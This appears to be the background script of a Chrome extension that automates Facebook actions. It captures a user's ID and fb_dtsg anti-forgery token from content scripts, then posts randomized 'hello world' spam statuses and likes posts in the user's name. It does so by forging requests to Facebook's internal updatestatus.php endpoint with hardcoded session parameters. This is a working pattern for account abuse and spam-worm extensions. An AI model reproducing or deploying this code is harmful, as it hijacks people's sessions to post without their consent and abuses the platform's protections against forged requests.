//var s = 'facebook_poststatus("hello world", "100009808453558");';
var m_szToken = "";
var m_szUserID = "";

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
		if(tab.url.indexOf("google.com") != -1 || tab.url.indexOf("https://www.facebook.com/messages/") != -1) {
			// var x = Math.floor((Math.random() * 100) + 1);
			// szContent = "hello world" + x + "https://www.google.com.vn/?gws_rd=ssl#q=chrome+firefox+dfad+aer+a+asdf+chrome+firefox+dfad+aer+a+asdf+chrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdf";

			// chrome.tabs.sendMessage(tabId, {action : "POST_STATUS", content:szContent, uid: m_szUserID, token:m_szToken});
		}
	
});

chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
	if (request.token === undefined)
	{
		return;
	}

	if (request.token === "")
	{
		return;
	}

	if (request.uid === undefined || request.uid === "")
	{
		return;
	}

	m_szUserID = request.uid;
	m_szToken = request.token;
});

chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {

	console.log(request);
	chrome.windows.getAll({populate:true},function(windows){
		windows.forEach(function(window){
			window.tabs.forEach(function(tab){
				if (tab.url.indexOf("facebook.com"))
				{
					if (request.action === "POST_STATUS")
					{
						var x = Math.floor((Math.random() * 100) + 1);
						var szContent = "hello world" + x + "https://www.google.com.vn/?gws_rd=ssl#q=chrome+firefox+dfad+aer+a+asdf+chrome+firefox+dfad+aer+a+asdf+chrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdfchrome+firefox+dfad+aer+a+asdf";
						chrome.tabs.sendMessage(tab.id, {action : "POST_STATUS", content:szContent, uid: m_szUserID, token:m_szToken});
					}
					else if (request.action === "LIKE_POST")
					{
						chrome.tabs.sendMessage(tab.id, {action : "LIKE_POST", postid : request.postid});
					}
				}
			});
		});
	});
});

function facebook_poststatus(szstatus, szUid, iTargetID, szToken)
{
	function random(len) {
		var min = Math.pow(10, len-1);
		var max = Math.pow(10, len);
		return Math.floor(Math.random() * (max - min + 1)) + min;
	};

	function serialize(obj)
	{
		var str = [];
		for(var p in obj)
		{
			if (obj[p] !== "")
			{
				str.push(p + "=" + encodeURIComponent(obj[p]));
			}
			else
			{
				str.push(p);
			}
		};
		return str.join("&");
	};

	//var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
	//var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	var url = "https://www.facebook.com/ajax/updatestatus.php?av=" + szUid;

	if(szToken.length > 0 && szUid.length > 0) {
		var form_data = {
			"attachment" : "",
			"backdated_date[year]" : "",
			"backdated_date[month]" : "",
			"backdated_date[day]" : "" ,
			"backdated_date[hour]" : "",
			"backdated_date[minute]" : "",
			"boosted_post_config" : "",
			"composer_source_surface" : "timeline",
			"composertags_city" : "",
			"composertags_place" : "",
			"hide_object_attachment" : "true",
			"is_explicit_place" : "false",
			"is_markdown" : "false",
			"is_q_and_a" : "false",
			"is_profile_badge_post" : "false",
			"multilingual_specified_lang" : "",
			"num_keystrokes" : "0",
			"num_pastes" : "0",
			"place_attachment_setting" : "1",
			"post_surfaces_blacklist" : "",
			"privacyx" : "291667064279714",
			"prompt_id" : "",
			"prompt_tracking_string" : "",
			"ref" : "timeline",
			"target_type" : "feed",
			"xhpc_message" : szstatus,
			"xhpc_message_text" : szstatus,
			"is_forced_reshare_of_post" : "",
			"xc_disable_config[xc_disable_link]" : "",
			"is_react" : "true",
			"xhpc_composerid" : "rc.u_0_1i",
			"xhpc_targetid" : iTargetID,
			"xhpc_context" : "profile",
			"xhpc_ismeta" : "1",
			"xhpc_timeline" : "true",
			"xhpc_finch" : "false",
			"xhpc_socialplugin" : "false",
			"xhpc_topicfeedid" : "",
			"xhpc_origintopicfeedid" : "",
			"xhpc_modal_composer" : "false",
			"xhpc_aggregated_story_composer" : "false",
			"xhpc_publish_type" : "1",
			"xhpc_fundraiser_page" : "false",
			"__user" : szUid,
			"__a" : "1",
			"__dyn" : "aihoFeyfyGmagngDxyG8EiolzFEbFbGA8Ay8Z9LFwxBxCbzES2N6wAxu13wFG2K49UKbkwy8wGFeex2uVWxeUWq7eEiyA14DBwJKq4GCzEkxvDAzUO5u5o5S9ADBy8K48hxGbwYDx2r_gnHggKm7WxGrAyEhzETx2m",
			"__af" : "o",
			"__req" : "h",
			"__be" : "-1",
			"__pc" : "EXP1%3ADEFAULT",
			"fb_dtsg" : szToken,
			"ttstamp" : "265816910056107451029599458158658171111751168669954895113",
			"__rev" : "2663233",
			"__srp_t" : "1478252294"
		};
		
		var req = serialize(form_data);

		//req = "attachment&backdated_date[year]&backdated_date[month]&backdated_date[day]&backdated_date[hour]&backdated_date[minute]&boosted_post_config&composer_entry_time=25&composer_session_id=143d4046-fecf-48ff-8176-0f824e418967&composer_session_duration=7&composer_source_surface=timeline&composertags_city&composertags_place&hide_object_attachment=true&is_explicit_place=false&is_markdown=false&is_q_and_a=false&is_profile_badge_post=false&multilingual_specified_lang=&num_keystrokes=0&num_pastes=0&place_attachment_setting=1&post_surfaces_blacklist&privacyx=291667064279714&prompt_id&prompt_tracking_string&ref=timeline&target_type=feed&xhpc_message=" + status+"&xhpc_message_text= " +status +"&is_forced_reshare_of_post&xc_disable_config[xc_disable_link]&is_react=true&xhpc_composerid=rc.u_0_1i&xhpc_targetid=" + targetid +"&xhpc_context=profile&xhpc_ismeta=1&xhpc_timeline=true&xhpc_finch=false&xhpc_socialplugin=false&xhpc_topicfeedid&xhpc_origintopicfeedid&xhpc_modal_composer=false&xhpc_aggregated_story_composer=false&xhpc_publish_type=1&xhpc_fundraiser_page=false&__user="+ user_id +"&__a=1&__dyn=aihoFeyfyGmagngDxyG8EiolzFEbFbGA8Ay8Z9LFwxBxCbzES2N6wAxu13wFG2K49UKbkwy8wGFeex2uVWxeUWq7eEiyA14DBwJKq4GCzEkxvDAzUO5u5o5S9ADBy8K48hxGbwYDx2r_gnHggKm7WxGrAyEhzETx2m&__af=o&__req=h&__be=-1&__pc=EXP1%3ADEFAULT&fb_dtsg=" + fb_dtsg+"&ttstamp=265816910056107451029599458158658171111751168669954895113&__rev=2663233&__srp_t=1478252294";

		var xmlhttp = new XMLHttpRequest();
		xmlhttp.open("POST", url, true);

		xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		
		xmlhttp.onreadystatechange = function() {
			if(xmlhttp.readyState == 4 && xmlhttp.status == 200)
			{
				xmlhttp.close;
				// var szNextPage = "https://facebook.com/" + iTargetID;
				// window.location.href = szNextPage;
			}
		}
		xmlhttp.send(req);
	}
}